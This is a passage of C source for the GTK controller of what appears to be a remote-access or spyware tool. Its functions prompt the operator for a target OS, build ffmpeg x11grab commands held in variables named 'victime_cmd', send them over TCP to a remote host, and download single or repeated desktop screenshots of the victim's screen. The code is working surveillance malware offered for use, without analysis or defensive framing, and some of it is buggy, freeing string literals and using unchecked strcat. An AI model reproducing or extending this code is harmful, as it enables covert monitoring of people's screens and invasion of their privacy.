        switch(gtk_dialog_run(GTK_DIALOG(check_input_dialog)))
        {
            case GTK_RESPONSE_OK:
                gtk_widget_destroy(check_input_dialog);
                return;

            default :
                gtk_widget_destroy(check_input_dialog);
                return;
        }
    }

    final_victime_cmd = malloc(256 * sizeof(char));
    if(final_victime_cmd == NULL)
    {
        error("malloc() final_victim_cmd", "cb_take_screenshot()");
        exit(-1);
    }

    receive_remote_resolution();

    if(strncmp(target_OS, "Ubuntu", 6) == 0 || strncmp(target_OS, "Kali", 4) == 0 || strncmp(target_OS, "Mint", 4) == 0)
    {
        final_victime_cmd = strncpy(final_victime_cmd, victime_cmd, len_cmd);
        final_victime_cmd = strncat(final_victime_cmd, resolution_final, strlen(resolution_final));
        final_victime_cmd = strcat(final_victime_cmd, " -i :0 -vframes 1 screenshot.jpeg");
    }

    if(strncmp(target_OS, "Debian", 6) == 0 || strncmp(target_OS, "Fedora", 6) == 0)
    {
        final_victime_cmd = strncpy(final_victime_cmd, victime_cmd, len_cmd);
        final_victime_cmd = strncat(final_victime_cmd, resolution_final, strlen(resolution_final));
        final_victime_cmd = strcat(final_victime_cmd, " -i :1 -vframes 1 screenshot.jpeg");
    }

    len_final_cmd = strlen(final_victime_cmd) + 1;

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "cb_take_screenshot()");
        exit(-1);
    }

    err = connect(sock, (SOCKADDR*)&sin, sizeof(sin));

    if(err == SOCKET_ERROR)
    {
        error("connect()", "cb_take_screenshot()");
        exit(-1);
    }

    printf("Taking and Downloading desktop screenshot ...\n");

    if(send(sock, (char*)&flag_screenshot, sizeof(flag_screenshot), 0) == SOCKET_ERROR)
    {
        error("send() flag_screenshot", "cb_take_screenshot()");
        exit(-1);
    }

    if(send(sock, (char*)&len_final_cmd, sizeof(len_final_cmd), 0) == SOCKET_ERROR)
    {
        error("send() len_final_cmd", "cb_take_screenshot()");
        exit(-1);
    }

    if(send(sock, final_victime_cmd, len_final_cmd, 0) == SOCKET_ERROR)
    {
        error("send() final_victime_cmd", "cb_take_screenshot()");
        exit(-1);
    }

    screenshot_file = fopen("Screenshots/screenshot.jpeg", "wb");
    if(screenshot_file == NULL)
    {
        error("fopen()", "cb_take_screenshot()");
        exit(-1);
    }

    if(recv(sock, (char*)&data_len, sizeof(data_len), 0) == SOCKET_ERROR)
    {
        error("recv() data_len", "cb_take_screenshot()");
        exit(-1);
    }

    printf("le screenshot pèse : %ld octets\n\n", data_len);

    do
    {
        tailleBlockRecut = recv(sock, buffer, sizeof(data_len), 0);

        fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, screenshot_file);

        totalRcv += tailleBlockRecut;

        //printf("Dowlading : %.2f Mo\n", (double)totalRcv / 1000000);

    }while(totalRcv < data_len);

    printf("Reception du screenshot success !!!!\n");

    fclose(screenshot_file);

    free(final_victime_cmd);
    free(resolution_final);

    // unsed parameters
    (void)button;
    (void)user_data;

    return;
}


void cb_multi_screenshot(GtkButton *button, gpointer user_data)
{
    GtkWidget *select_src_dialog = NULL;
    GtkWidget *target_OS_entry = NULL;
    const gchar *target_OS = NULL;
    GtkWidget *check_input_dialog = NULL;

    //const gchar *victime_cmd = "ffmpeg -f x11grab -framerate 1 -r 1 -video_size 1920x1080 -i :0.0 -vframes 5 screenshot-%05d.jpeg";
    //const gchar *victime_cmd = "ffmpeg -f x11grab -framerate 1 -r ";
    const gchar *victime_cmd = "ffmpeg -f x11grab -framerate 1 -r ";

    gchar *final_victime_cmd = NULL;

    size_t len_cmd = strlen(victime_cmd) + 1;
    size_t len_final_cmd = 0;

    SOCKET sock = 0;
    SOCKADDR_IN sin;

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    size_t flag_screenshot = 21;
    int err = 0;

    GtkWidget *interval_screenshot_dialog = NULL;
    GtkWidget *format_screenshot_dialog = NULL;

    GtkWidget *number_of_screenshot_entry = NULL;
    GtkWidget *format_screenshot_entry = NULL;

    const gchar *interval = NULL;
    const gchar *number_of_screenshot = NULL;

    int total_number_of_screenshot = 0;
    int delay_interval = 0;
    int real_time_interval = 0;

    //GtkWidget *warning_dialog_number = NULL;
    GtkWidget *warning_dialog_format = NULL;

    char buffer[BUFSIZ] = "";

    FILE *screenshot_file = NULL;
    long tailleBlockRecut = 0;
    size_t data_len = 0;
    size_t totalRcv = 0;

    char temp_filename[128];
    time_t temps;

    char copy_cmd[256] = "";

    char *file_name[] = {
                            "Screenshots/1.jpeg", "Screenshots/2.jpeg", "Screenshots/3.jpeg", "Screenshots/4.jpeg", "Screenshots/5.jpeg", "Screenshots/6.jpeg",
                            "Screenshots/7.jpeg", "Screenshots/8.jpeg", "Screenshots/9.jpeg", "Screenshots/10.jpeg", "Screenshots/11.jpeg", "Screenshots/12.jpeg",
                            "Screenshots/13.jpeg", "Screenshots/14.jpeg", "Screenshots/15.jpeg", "Screenshots/16.jpeg", "Screenshots/17.jpeg", "Screenshots/18.jpeg",
                            "Screenshots/19.jpeg", "Screenshots/20.jpeg", "Screenshots/21.jpeg", "Screenshots/22.jpeg", "Screenshots/23.jpeg", "Screenshots/24.jpeg",
                            "Screenshots/25.jpeg", "Screenshots/26.jpeg", "Screenshots/27.jpeg", "Screenshots/28.jpeg", "Screenshots/29.jpeg", "Screenshots/30.jpeg",
                            "Screenshots/31.jpeg", "Screenshots/32.jpeg", "Screenshots/33.jpeg", "Screenshots/34.jpeg", "Screenshots/35.jpeg", "Screenshots/36.jpeg",
                            "Screenshots/37.jpeg", "Screenshots/38.jpeg", "Screenshots/39.jpeg", "Screenshots/40.jpeg", "Screenshots/41.jpeg", "Screenshots/42.jpeg",
                            "Screenshots/43.jpeg", "Screenshots/44.jpeg", "Screenshots/45.jpeg", "Screenshots/46.jpeg", "Screenshots/47.jpeg", "Screenshots/48.jpeg",
                            "Screenshots/49.jpeg", "Screenshots/50.jpeg", "Screenshots/51.jpeg", "Screenshots/52.jpeg", "Screenshots/53.jpeg", "Screenshots/54.jpeg",
                            "Screenshots/55.jpeg", "Screenshots/56.jpeg", "Screenshots/57.jpeg", "Screenshots/58.jpeg", "Screenshots/59.jpeg", "Screenshots/60.jpeg",
                            "Screenshots/61.jpeg", "Screenshots/62.jpeg", "Screenshots/63.jpeg", "Screenshots/64.jpeg", "Screenshots/65.jpeg", "Screenshots/66.jpeg",
                            "Screenshots/67.jpeg", "Screenshots/68.jpeg", "Screenshots/69.jpeg", "Screenshots/70.jpeg", "Screenshots/71.jpeg", "Screenshots/72.jpeg",
                            "Screenshots/73.jpeg", "Screenshots/74.jpeg", "Screenshots/75.jpeg", "Screenshots/76.jpeg", "Screenshots/77.jpeg", "Screenshots/78.jpeg",
                            "Screenshots/79.jpeg", "Screenshots/80.jpeg", "Screenshots/81.jpeg", "Screenshots/82.jpeg", "Screenshots/83.jpeg", "Screenshots/84.jpeg",
                            "Screenshots/85.jpeg", "Screenshots/86.jpeg", "Screenshots/87.jpeg", "Screenshots/88.jpeg", "Screenshots/89.jpeg", "Screenshots/90.jpeg",
                            "Screenshots/91.jpeg", "Screenshots/92.jpeg", "Screenshots/93.jpeg", "Screenshots/94.jpeg", "Screenshots/95.jpeg", "Screenshots/96.jpeg",
                            "Screenshots/97.jpeg", "Screenshots/98.jpeg", "Screenshots/99.jpeg", "Screenshots/100.jpeg","Screenshots/101.jpeg", "Screenshots/102.jpeg",
                            "Screenshots/103.jpeg", "Screenshots/104.jpeg", "Screenshots/105.jpeg", "Screenshots/106.jpeg","Screenshots/107.jpeg", "Screenshots/108.jpeg",
                            "Screenshots/109.jpeg", "Screenshots/110.jpeg", "Screenshots/111.jpeg", "Screenshots/112.jpeg", "Screenshots/113.jpeg", "Screenshots/114.jpeg",
                            "Screenshots/115.jpeg", "Screenshots/116.jpeg", "Screenshots/117.jpeg", "Screenshots/118.jpeg","Screenshots/119.jpeg", "Screenshots/120.jpeg",
                            "Screenshots/121.jpeg", "Screenshots/122.jpeg", "Screenshots/123.jpeg", "Screenshots/124.jpeg", "Screenshots/125.jpeg", "Screenshots/126.jpeg",
                            "Screenshots/127.jpeg", "Screenshots/128.jpeg", "Screenshots/129.jpeg", "Screenshots/130.jpeg", "Screenshots/131.jpeg", "Screenshots/132.jpeg",
                            "Screenshots/133.jpeg", "Screenshots/134.jpeg", "Screenshots/135.jpeg", "Screenshots/136.jpeg", "Screenshots/137.jpeg", "Screenshots/138.jpeg",
                            "Screenshots/139.jpeg", "Screenshots/140.jpeg", "Screenshots/141.jpeg", "Screenshots/142.jpeg", "Screenshots/143.jpeg", "Screenshots/144.jpeg",
                            "Screenshots/145.jpeg", "Screenshots/146.jpeg", "Screenshots/147.jpeg", "Screenshots/148.jpeg", "Screenshots/149.jpeg", "Screenshots/150.jpeg",
                            "Screenshots/151.jpeg", "Screenshots/152.jpeg", "Screenshots/153.jpeg", "Screenshots/154.jpeg", "Screenshots/155.jpeg", "Screenshots/156.jpeg",
                            "Screenshots/157.jpeg", "Screenshots/158.jpeg", "Screenshots/159.jpeg", "Screenshots/160.jpeg", "Screenshots/161.jpeg", "Screenshots/162.jpeg",
                            "Screenshots/163.jpeg", "Screenshots/164.jpeg", "Screenshots/165.jpeg", "Screenshots/166.jpeg", "Screenshots/167.jpeg", "Screenshots/168.jpeg",
                            "Screenshots/169.jpeg", "Screenshots/170.jpeg", "Screenshots/171.jpeg", "Screenshots/172.jpeg", "Screenshots/173.jpeg", "Screenshots/174.jpeg",
                            "Screenshots/175.jpeg", "Screenshots/176.jpeg", "Screenshots/177.jpeg", "Screenshots/178.jpeg", "Screenshots/179.jpeg", "Screenshots/180.jpeg",
                            "Screenshots/181.jpeg", "Screenshots/182.jpeg", "Screenshots/183.jpeg", "Screenshots/184.jpeg", "Screenshots/185.jpeg", "Screenshots/186.jpeg",
                            "Screenshots/187.jpeg", "Screenshots/188.jpeg", "Screenshots/189.jpeg", "Screenshots/190.jpeg", "Screenshots/191.jpeg", "Screenshots/192.jpeg",
                            "Screenshots/193.jpeg", "Screenshots/194.jpeg", "Screenshots/195.jpeg", "Screenshots/196.jpeg", "Screenshots/197.jpeg", "Screenshots/198.jpeg",
                            "Screenshots/199.jpeg", "Screenshots/200.jpeg"
                        };
    int i = 0;
    int j = 1;

    select_src_dialog = gtk_dialog_new_with_buttons("Enter the target OS : Ubuntu/Mint/Kali/Debian/Fedora", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    gtk_widget_set_size_request(select_src_dialog, 450, 100);

    target_OS_entry  = gtk_entry_new();
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(select_src_dialog)->vbox), target_OS_entry, TRUE, FALSE, 0);

    gtk_widget_show_all(GTK_DIALOG(select_src_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(select_src_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            target_OS = gtk_entry_get_text(GTK_ENTRY(target_OS_entry));
            gtk_widget_hide(select_src_dialog);
            break;

        default:
            gtk_widget_destroy(select_src_dialog);
            return;
    }


    if(memcmp(target_OS, "Ubuntu", 6) != 0 && memcmp(target_OS, "Mint", 4) != 0 && memcmp(target_OS, "Kali", 4) != 0 && memcmp(target_OS, "Debian", 6) != 0 && memcmp(target_OS, "Fedora", 6) != 0)
    {
        check_input_dialog = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_WARNING, GTK_BUTTONS_OK, "You did not entered a correct value.");

        gtk_widget_show_all(GTK_DIALOG(check_input_dialog)->vbox);
        switch(gtk_dialog_run(GTK_DIALOG(check_input_dialog)))
        {
            case GTK_RESPONSE_OK:
                gtk_widget_destroy(check_input_dialog);
                return;

            default :
                gtk_widget_destroy(check_input_dialog);
                return;
        }
    }

    interval_screenshot_dialog = gtk_dialog_new_with_buttons("Interval beetween each screenshot", GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_STOCK_OK, GTK_RESPONSE_OK, NULL);

    gtk_widget_set_size_request(interval_screenshot_dialog, 390, 100);

    number_of_screenshot_entry = gtk_entry_new();

    gtk_entry_set_text(GTK_ENTRY(number_of_screenshot_entry), "0.5 = 2sec/0.25 = 4sec/0.125 = 8sec/0.0625 = 16sec ...");

    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(interval_screenshot_dialog)->vbox), number_of_screenshot_entry, TRUE, FALSE, 0);

    gtk_widget_show_all(GTK_DIALOG(interval_screenshot_dialog)->vbox);

    switch(gtk_dialog_run(GTK_DIALOG(interval_screenshot_dialog)))
    {
        case GTK_RESPONSE_OK:
            interval = gtk_entry_get_text(GTK_ENTRY(number_of_screenshot_entry));
            gtk_widget_hide(interval_screenshot_dialog);
            break;

        case GTK_RESPONSE_NONE:
            break;

        default:
            break;
    }

    number_of_screenshot = malloc(4 * sizeof(char));
    if(number_of_screenshot == NULL)
    {
        error("malloc() number_of_screenshot", "cb_multi_screenshot()");
        exit(-1);
    }

    do
    {
        format_screenshot_dialog = gtk_dialog_new_with_buttons("Screenshots", GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_STOCK_OK, GTK_RESPONSE_OK, NULL);

        gtk_widget_set_size_request(format_screenshot_dialog, 310, 100);

        format_screenshot_entry = gtk_entry_new();

        gtk_entry_set_text(GTK_ENTRY(format_screenshot_entry), "Number of screenshot(s) you want to take");

        gtk_box_pack_start(GTK_BOX(GTK_DIALOG(format_screenshot_dialog)->vbox), format_screenshot_entry, TRUE, FALSE, 0);

        gtk_widget_show_all(GTK_DIALOG(format_screenshot_dialog)->vbox);

        switch(gtk_dialog_run(GTK_DIALOG(format_screenshot_dialog)))
        {
            case GTK_RESPONSE_OK:
                number_of_screenshot = gtk_entry_get_text(GTK_ENTRY(format_screenshot_entry));
                gtk_widget_hide(format_screenshot_dialog);
                break;

            default:
                gtk_widget_hide(format_screenshot_dialog);
                return;
        }

        if(atoi(number_of_screenshot) <= 0)
        {
            warning_dialog_format = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_WARNING, GTK_BUTTONS_CLOSE, "You can't enter zero or a negative number of screenshots");

            switch(gtk_dialog_run(GTK_DIALOG(warning_dialog_format)))
            {
                case GTK_RESPONSE_CLOSE:
                    gtk_widget_destroy(warning_dialog_format);
                    break;

                default:
                    gtk_widget_destroy(warning_dialog_format);
                    break;
            }
        }

    }while(atoi(number_of_screenshot) <= 0);

    /** faire un switch **/
    if(strcmp(interval, "0.5") == 0)
    {
        delay_interval = 2 * atoi(number_of_screenshot);
        real_time_interval = 2;
    }

    if(strcmp(interval, "0.25") == 0)
    {
        delay_interval = 4 * atoi(number_of_screenshot);
        real_time_interval = 4;
    }

    if(strcmp(interval, "0.1667") == 0)
    {
        delay_interval = 6 * atoi(number_of_screenshot);
        real_time_interval = 6;
    }

    if(strcmp(interval, "0.125") == 0)
    {
        delay_interval = 8 * atoi(number_of_screenshot);
        real_time_interval = 8;
    }

    if(strcmp(interval, "0.1") == 0)
    {
        delay_interval = 10 * atoi(number_of_screenshot);
        real_time_interval = 10;
    }

    if(strcmp(interval, "0.0833") == 0)
    {
        delay_interval = 12 * atoi(number_of_screenshot);
        real_time_interval = 12;
    }

    if(strcmp(interval, "0.0714") == 0)
    {
        delay_interval = 14 * atoi(number_of_screenshot);
        real_time_interval = 14;
    }

    if(strcmp(interval, "0.0625") == 0)
    {
        delay_interval = 16 * atoi(number_of_screenshot);
        real_time_interval = 16;
    }

    if(strcmp(interval, "0.05") == 0)
    {
        delay_interval = 20 * atoi(number_of_screenshot);
        real_time_interval = 20;
    }

    if(strcmp(interval, "0.04") == 0)
    {
        delay_interval = 25 * atoi(number_of_screenshot);
        real_time_interval = 25;
    }

    if(strcmp(interval, "0.0333") == 0)
    {
        delay_interval = 30 * atoi(number_of_screenshot);
        real_time_interval = 30;
    }

    if(strcmp(interval, "0.0167") == 0)
    {
        delay_interval = 60 * atoi(number_of_screenshot);
        real_time_interval = 60;
    }

    if(strcmp(interval, "0.0083") == 0)
    {
        delay_interval = 120 * atoi(number_of_screenshot);
        real_time_interval = 120;
    }

    if(strcmp(interval, "0.0056") == 0)
    {
        delay_interval = 180 * atoi(number_of_screenshot);
        real_time_interval = 180;
    }

    if(strcmp(interval, "0.0033") == 0)
    {
        delay_interval = 300 * atoi(number_of_screenshot);
        real_time_interval = 300;
    }

    if(strcmp(interval, "0.0017") == 0)
    {
        delay_interval = 600 * atoi(number_of_screenshot);
        real_time_interval = 600;
    }

    if(strcmp(interval, "0.0008") == 0)
    {
        delay_interval = 1200 * atoi(number_of_screenshot);
        real_time_interval = 1200;
    }

    printf("\n\ndelay interval = %d\n\n", delay_interval);  // FAIRE TOUTE LES INTERVALE

    final_victime_cmd = malloc(128 * sizeof(char));
    if(final_victime_cmd == NULL)
    {
        error("malloc() final_victim_cmd", "cb_multi_screenshot()");
        exit(-1);
    }

    receive_remote_resolution();

    if(strncmp(target_OS, "Ubuntu", 6) == 0 || strncmp(target_OS, "Kali", 4) == 0 || strncmp(target_OS, "Mint", 4) == 0)
    {
        final_victime_cmd = strncpy(final_victime_cmd, victime_cmd, len_cmd);
        final_victime_cmd = strcat(final_victime_cmd, interval);
        final_victime_cmd = strcat(final_victime_cmd, " -video_size");
        final_victime_cmd = strcat(final_victime_cmd, resolution_final);
        final_victime_cmd = strcat(final_victime_cmd, "  -i :0 -vframes ");
        final_victime_cmd = strcat(final_victime_cmd, number_of_screenshot);
        final_victime_cmd = strcat(final_victime_cmd, " %");
        final_victime_cmd = strcat(final_victime_cmd, "d.jpeg");
    }

    if(strncmp(target_OS, "Debian", 6) == 0 || strncmp(target_OS, "Fedora", 6) == 0)
    {
        final_victime_cmd = strncpy(final_victime_cmd, victime_cmd, len_cmd);
        final_victime_cmd = strcat(final_victime_cmd, interval);
        final_victime_cmd = strcat(final_victime_cmd, " -video_size");
        final_victime_cmd = strcat(final_victime_cmd, resolution_final);
        final_victime_cmd = strcat(final_victime_cmd, "  -i :1 -vframes ");
        final_victime_cmd = strcat(final_victime_cmd, number_of_screenshot);
        final_victime_cmd = strcat(final_victime_cmd, " %");
        final_victime_cmd = strcat(final_victime_cmd, "d.jpeg");
    }

    len_final_cmd = strlen(final_victime_cmd) + 1;

    total_number_of_screenshot = atoi(number_of_screenshot);
    printf("\n\ntotal screenshot = %d\n\n", total_number_of_screenshot);

    gtk_widget_destroy(format_screenshot_dialog);

    gtk_widget_destroy(interval_screenshot_dialog);

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "cb_multi_screenshot()");
        exit(-1);
    }

    err = connect(sock, (SOCKADDR*)&sin, sizeof(sin));

    if(err == SOCKET_ERROR)
    {
        error("connect()", "cb_multi_screenshot()");
        exit(-1);
    }

    if(send(sock, (char*)&flag_screenshot, sizeof(flag_screenshot), 0) == SOCKET_ERROR)
    {
        error("send() flag_screenshot", "cb_multi_screenshot()");
        exit(-1);
    }

    //system("mkdir Screenshots/`date +%m_%d_%Y`");

    if(flag_screenshot == 21)
    {
        if(send(sock, (char*)&total_number_of_screenshot, sizeof(total_number_of_screenshot), 0) == SOCKET_ERROR)
        {
            error("send() total_number_of_screenshot", "cb_multi_screenshot()");
            exit(-1);
        }

        if(send(sock, (char*)&delay_interval, sizeof(delay_interval), 0) == SOCKET_ERROR)
        {
            error("send() delay_interval", "cb_multi_screenshot()");
            exit(-1);
        }

        if(send(sock, (char*)&len_final_cmd, sizeof(len_final_cmd), 0) == SOCKET_ERROR)
        {
            error("send() len_final_cmd", "cb_multi_screenshot()");
            exit(-1);
        }

        if(send(sock, final_victime_cmd, len_final_cmd, 0) == SOCKET_ERROR)
        {
            error("send() final_victime_cmd", "cb_multi_screenshot()");
            exit(-1);
        }

        do
        {
            if(recv(sock, (char*)&data_len, sizeof(data_len), 0) == SOCKET_ERROR)
            {
                error("recv() data_len", "cb_multi_screenshot()");
                exit(-1);
            }

            printf("\nfile_name : %s\n", file_name[i]);

            screenshot_file = fopen(file_name[i], "wb");
            if(screenshot_file == NULL)
            {
                error("fopen()", "cb_multi_screenshot()");
                exit(-1);
            }

            printf("\n\nLe screenshot pèse : %ld octets\n", data_len);

            do
            {
                tailleBlockRecut = recv(sock, buffer, sizeof(data_len), 0);

                fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, screenshot_file);

                totalRcv += (size_t)tailleBlockRecut;

                //printf("Downloading : %.2f Mo\n\n", (double)totalRcv / 1000000);

            }while(totalRcv < data_len);

            printf("Reception du screenshot success !!!!\n");

            fclose(screenshot_file);
            totalRcv = 0;

            time(&temps);
            strftime(temp_filename, 128, "%a-%d-%m-%y_%Hh%Mmin%Ssec_%Z", localtime(&temps));

            rename(file_name[i], temp_filename);

            strcpy(copy_cmd, "mv ");
            strcat(copy_cmd, temp_filename);
            strcat(copy_cmd, " ");
            strcat(copy_cmd, "Screenshots/");
            system(copy_cmd);

            wait_time_end(real_time_interval);

            i++;
            j++;

        }while(j <= total_number_of_screenshot);

        for(i = 0; i < total_number_of_screenshot; i++)
            free(file_name[i]);


        free(final_victime_cmd);
        free(resolution_final);
    }

    // unsed parameters
    (void)button;
    (void)user_data;

    return;
}

